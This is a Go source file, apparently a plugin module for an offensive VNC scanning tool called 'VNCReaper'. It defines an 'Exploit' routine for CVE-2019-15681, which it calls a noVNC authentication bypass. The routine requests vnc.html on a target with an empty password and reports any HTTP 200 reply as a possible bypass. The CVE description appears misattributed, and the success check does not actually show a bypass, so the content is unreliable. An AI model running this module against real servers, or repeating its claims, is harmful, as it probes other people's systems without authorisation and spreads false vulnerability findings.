package cves

import (
	"fmt"
	"net/http"
	"strings"
	"time"

	"github.com/comedymoon/VNCReaper/internal/types"
)

// CVE-2019-15681 - noVNC authentication bypass
type CVE201915681 struct{}

func (c CVE201915681) Name() string {
	return "CVE-2019-15681"
}

func (c CVE201915681) Description() string {
	return "noVNC before 1.1.0 allows authentication bypass via crafted WebSocket requests."
}

func (c CVE201915681) Exploit(target types.ScanResult) (bool, string) {
	if !strings.Contains(strings.ToLower(target.Protocol), "novnc") {
		return false, ""
	}

	url := fmt.Sprintf("http://%s:%s/vnc.html?autoconnect=true&password=", target.IP, target.Port)

	client := http.Client{
		Timeout: 5 * time.Second,
	}
	resp, err := client.Get(url)
	if err != nil {
		return false, ""
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		return true, "Possible auth bypass at " + url
	}
	return false, ""
}

func init() {
	Register(CVE201915681{})
}